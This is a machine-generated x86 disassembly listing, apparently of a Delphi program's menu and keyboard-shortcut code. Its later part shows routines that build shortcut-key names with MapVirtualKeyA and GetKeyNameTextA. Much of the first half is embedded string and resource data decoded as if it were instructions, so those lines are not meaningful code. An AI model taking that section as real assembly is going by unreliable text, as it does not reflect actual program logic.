add [ bx + si ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah bl
out dx eax
inc esp
add [ ebx ] cl
insd
jb r-xdata
push 0x6e490774
jb r-xdata
inc esp
add [ eax ] cl
adc eax 0x6e654d54
add [ eax - 0x11 ] dh
ja r-xdata
insd
inc ebp
jbe r-xdata
or [ edi ] al
inc ecx
inc ebx
popad
outsb
jbe r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x7 ] si
adc [ 0x63655241 ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
push ebx
insb
add [ eax ] cl
jne r-xdata
arpl [ ebp + 0x9 ] sp
push esp
dec ebp
outsb
add [ ecx + ebx + 0x42 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x44efe0c0 ] cl
add [ ebx ] al
adc [ ebp + ecx * 2 + 0x65 ] edx
outsb
inc esp
inc eax
add [ eax + 0x34 ] dh
inc eax
outsd
insd
popad
je r-xdata
jne r-xdata
dec ebp
outsb
dec ecx
je r-xdata
dec ebp
outsb
jb r-xdata
arpl [ eax + ecx + 0x7 ] si
jb r-xdata
ja r-xdata
je r-xdata
dec ebp
outsb
jne r-xdata
outsb
je r-xdata
jb r-xdata
jae r-xdata
push esp
push edx
arpl [ gs : eax + eax + 0x8 ] si
arpl [ gs : eax + ecx + 0x7 ] si
jae r-xdata
je r-xdata
je r-xdata
add [ esp + esi + 0x40 ] dh
movsb [ edi ] [ esi ]
arpl [ eax ] cx
insd
popad
dec ebp
popad
insd
inc ebp
jbe r-xdata
add [ eax ] al
add [ edi + eax * 8 + 0x34640044 ] ah
jne r-xdata
popad
inc ecx
jne r-xdata
jae r-xdata
jb r-xdata
add [ 0x74646957 ] eax
je r-xdata
jne r-xdata
dec ebp
outsb
insd
inc ebp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
inc ecx
inc ebx
popad
outsb
jbe r-xdata
or [ edi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ 0x63655241 ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
arpl [ gs : ebp + 0x64 ] si
pop es
insb
je r-xdata
add eax 0x63655241
inc ebp
add [ eax ] al
add al 0x42
inc esi
insb
popad
add [ bx + si ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah bl
out dx eax
inc esp
add [ 0x756e654d ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 8 ] dl
insd
inc ecx
jne r-xdata
mov [ eax + eax + 0x64 ] 0x70004034
xor al 0x40
insb
or [ ebp + 0x61 ] ch
push eax
popad
jb r-xdata
outsb
je r-xdata
add ah ch
add eax 0x3500045
inc edx
add ah ah
add eax [ edx ]
cmp [ edx + eax * 2 ] al
add al dl
add al [ ebp ]
or [ ebx ] al
inc ebp
add [ eax ] bh
add eax [ ebp ]
int3
inc edx
outsd
push esp
inc ebx
popad
outsb
jbe r-xdata
je r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
je r-xdata
dec ebp
outsb
je r-xdata
add [ 0x74617453 ] al
andps xmm1 [ gs : edi + 0x77 ]
push esp
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
jae r-xdata
push esp
adc [ eax ] al
mov eax eax
loopne r-xdata
inc esp
add [ eax + eax ] bl
add [ eax ] al
rcr [ eax + 0x44f0 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xf1
outsd
inc esi
insb
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax - 0x73ffbdfd ] bl
add al [ ebp ]
int3
xor al 0x40
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
jne r-xdata
imul esp [ ebx + 0x8 ] 0x614d616d
jae r-xdata
je r-xdata
add [ ecx + edx + 0x40 ] bl
add [ ecx + ebx + 0x42 ] dl
add [ eax ] al
add [ eax ] al
add [ edx - 0x108fffc0 ] bh
add al 0x8
push es
push ebx
outsb
je r-xdata
popad
je r-xdata
add eax 0x63655241
jne r-xdata
sub al dh
inc esp
add [ ebx ] al
or eax 0x6e654d54
dec ebp
outsb
jne r-xdata
jb r-xdata
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
push 0x746e4907
add eax 0x74646957
add [ ecx + edx + 0x40 ] bl
dec ecx
outsb
outsb
andps xmm1 [ edi + 0x77 ]
add [ edx + eax + 0x3cc0045 ] cl
inc edx
add [ esp + eax + 0x4000045 ] ah
sub_44f128
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xc0044f1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dl
int1
inc esp
add dh bh
int1
inc esp
add [ eax + eax - 0x75980000 ] ch
inc ecx
add [ edx + eax + 0x34700042 ] ch
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ esi + eax + 0x2f200045 ] dl
inc ebp
add [ esp + ecx - 0x58bfffbb ] ah
inc ecx
add ah ch
or al [ ebp ]
cwde
das
inc ebp
add [ edi + edi * 8 + 0x940041 ] bl
inc edx
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
sub_44f199
add al [ edx ]
sbb [ esi ] al
inc ebp
add [ eax + 0x21 ] ch
inc ebp
add al bh
push cs
inc ebp
add [ eax ] bl
and eax [ ebp ]
test [ edx ] ch
inc ebp
add [ eax + 0x28 ] al
inc ebp
add [ eax + 0x29 ] bh
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
xor [ eax ] al
add [ eax ] al
int3
sub_44f1e2
mov esp 0xbc00452c
inc ebp
add [ edi + 0x27c40045 ] cl
inc ebp
add [ esp + ebp ] ch
inc ebp
add [ eax ] bl
sub al 0x45
add [ eax ] bl
and eax 0x54090045
dec ebp
outsb
jne r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push es
add [ esi ] al
inc edx
inc ebx
push 0xdc6b6365
out dx eax
inc esp
add [ ebx ] bh
add [ eax ] al
dec [ edi + esi + 0x45 ]
add [ ecx ] al
arpl [ ebx - 0x24 ] bp
insd
or al 0xf2
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
add [ eax ] 0x0
add [ eax ] al
je r-xdata
outsb
jne r-xdata
imul ecx esp 0x10
inc eax
add [ eax ] dh
add [ eax ] al
[ 0x2e000045 ]
popad
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
insd
jo r-xdata
insb
adc [ eax ] al
aas
add [ eax ] al
[ eax + 0x26 ]
insd
popad
jae r-xdata
add bh bh
sub al 0x25
inc ebp
add [ eax ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
popad
jo r-xdata
fsub st7
inc esp
add [ eax + eax ] bh
add bh bh
enter 0x4538 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x2 ] al
add eax 0x75411100
je r-xdata
inc esp
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
inc esp
add [ ebx + ecx * 4 + 0x41 ] ah
add [ eax ] bl
add [ 0x756e654d ] al
jae r-xdata
adc [ eax ] al
cmp al [ eax ]
add bh bh
in al 0x27
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
jne r-xdata
add [ eax ] al
push eax
and eax 0x2e400045
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
pushfd
and eax 0x2e200045
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
pop es
inc ebx
push 0x656b6365
fcom st7
inc esp
add [ eax + eax ] bh
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
[ ebp + 0x2e200045 ]
imul esi [ ebp + ebp * 2 + 0x61 ] 0x44edf070
add [ eax ] cl
add bh bh
sbb al 0x25
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ 0x61657242 ] al
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
rcr [ edi ] 0x1
inc edx
add [ eax ] ah
sub eax [ ebp ]
mov eax 0x100452b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060006 ] al
add [ eax ] al
add [ edx ] 0x0
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
mov [ ecx ] es
lodsb [ esi ]
inc ebp
add [ eax + 0x2b ] cl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41060002 ] al
js r-xdata
je r-xdata
shr [ esi ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
int3
adc [ eax ] al
cmp [ eax ] eax
add bh bh
cwde
add [ eax ] al
inc ebx
jne r-xdata
inc ecx
add [ edx + eax + 0x34700042 ] ch
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
dec [ edi ]
inc ebp
add al ah
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0xb0656c62
js r-xdata
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
xor al 0x40
ja r-xdata
je r-xdata
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ eax ]
das
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070014 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
add dl ah
cmc
je r-xdata
shl ch 0x1
insd
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
inc edx
add ah al
add al [ edx ]
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add ah cl
cmp [ ebp ] eax
and al 0xa8
inc ecx
add [ esi + edi * 8 - 0x58bfffbf ] dh
inc ecx
add ah dh
inc ecx
inc ebp
add [ eax - 0x63ffbabe ] dl
xor al 0x40
insd
insb
out dx eax
inc esp
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add dh dh
cmc
inc esp
add [ eax ] bl
add [ eax ] al
push 0xac00418a
add al [ edx ]
jo r-xdata
jae r-xdata
add [ 0x654d6e4f ] cl
popad
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
jb r-xdata
inc ebp
add [ edi + edi * 8 + 0x940041 ] bl
dec ecx
je r-xdata
inc [ ecx ]
xchg esp eax
add [ edx ] al
les eax [ edx ]
inc edx
add [ edi + edi * 8 - 0x5bffbf ] ch
inc ecx
add ah cl
add al [ edx ]
xor [ ecx ] bh
inc ebp
add ah bl
inc ecx
inc ebp
add [ eax ] ah
cmp al [ ebp ]
or al 0x42
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
cmp al 0x0
add [ eax ] al
add eax [ eax ]
std
inc esp
add [ eax ] al
test [ eax + eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
loop r-xdata
insd
lea eax [ eax ]
xchg esp eax
cmc
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
cmc
sub_44f3bb
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
adc [ eax ] al
cmp eax 0x90ff0000
sub al 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0x986d6574
dec ecx
outsb
js r-xdata
mov al 0x78
inc ecx
add [ eax ] ah
add bh bh
clc
inc ebp
add al al
inc ebp
adc al 0xd7
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
cwde
add [ eax ] al
inc ebx
jne r-xdata
je r-xdata
add [ eax + eax ] dl
call [ eax + eax ]
inc [ eax + 0x452e ]
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
dec eax
insb
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add dh dh
cmc
inc esp
add [ eax ] bl
add [ eax ] al
push 0xac00418a
add al [ edx ]
jo r-xdata
add [ 0x654d6e4f ] cl
popad
je r-xdata
inc ecx
add [ edx + eax + 0x34700042 ] ch
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
dec [ edi ]
inc ebp
add al ah
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0xb0656c62
js r-xdata
inc esp
add [ eax ] al
add bh bh
sbb al 0x27
inc ebp
add [ eax + 0x452e ] ah
add [ eax ] al
cmp bh 0xff
xlat
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
inc edx
add ah al
add al [ edx ]
inc eax
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
jb r-xdata
shl ch 0x1
insd
hlt
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
xor al 0x40
ja r-xdata
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ eax ]
das
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070014 ] al
outsb
inc ebx
insb
outsd
dec ecx
je r-xdata
js r-xdata
inc ebp
add [ edi + edi * 8 + 0x940041 ] bl
dec ecx
je r-xdata
add dl ah
cmc
je r-xdata
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
js r-xdata
insd
cwde
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
shr [ esi ] 0x45
int3
inc [ ecx ]
xchg esp eax
add [ edx ] al
les eax [ edx ]
inc edx
add [ edi + edi * 8 - 0x5bffbf ] ch
inc ecx
add ah cl
add al [ edx ]
xor [ ecx ] bh
inc ebp
add ah bl
inc ecx
inc ebp
add [ eax ] ah
cmp al [ ebp ]
or al 0x42
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
cmp al 0x0
add [ eax ] al
add eax [ eax ]
std
inc esp
add [ eax ] al
test [ eax + eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
loop r-xdata
insd
lea eax [ eax ]
xchg esp eax
cmc
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
cmc
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add ah cl
cmp [ ebp ] eax
and al 0xa8
inc ecx
add [ esi + edi * 8 - 0x58bfffbf ] dh
inc ecx
add ah dh
inc ecx
inc ebp
add [ eax - 0x63ffbabe ] dl
xor al 0x40
jae r-xdata
insd
insb
out dx eax
inc esp
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
sub_44fcc8
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_43f11c
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_444978
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_44fd20
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_44fd58
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403f6c
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_4041dc
sub_44fdac
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_44ff95
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404004
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_404154
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404004
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_404004
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_404154
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_404154
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403f6c
mov eax esi
call sub_403f6c
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_404004
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_408240
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404278
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_44fd58
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404234
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404004
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404234
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404234
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404234
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ff9c
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f90
retn
sub_44ffb0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_40422c
push eax
mov eax edi
call sub_40422c
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40422c
push eax
mov eax edi
call sub_40442c
push eax
mov eax [ esi ]
call sub_40442c
pop edx
pop ecx
call sub_408120
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_40422c
mov ecx eax
mov eax esi
mov edx 0x1
call sub_4044cc
sub_45000c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40441c
xor eax eax
push ebp
push sub_4500e7
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_44ffb0
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44ffb0
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44ffb0
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44ffb0
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4500ee
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44fdac
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4080d0
test eax eax
jne r-xdata
sub_450124
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_4526c4
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_4526d4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_450184
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_4526c4
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_4526c4
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4526d4
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4526d4
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_450124
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_450124
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4526d4
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4526d4
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_4502d0
push ebx
mov ebx eax
mov eax ebx
call sub_44ce78
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033cc
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_455288
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_450308
push ebx
mov ebx eax
mov eax ebx
call sub_44ce8c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033cc
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_450338
push ebx
mov ebx eax
mov eax ebx
call sub_44cea0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033cc
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_450368
push ebx
mov ebx eax
mov eax ebx
call sub_44cec8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033cc
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_450398
push ebx
mov ebx eax
mov eax ebx
call sub_44cef0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033cc
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_404378
je r-xdata
mov al 0x1
pop ebx
retn
sub_4503cc
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44ceb4
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
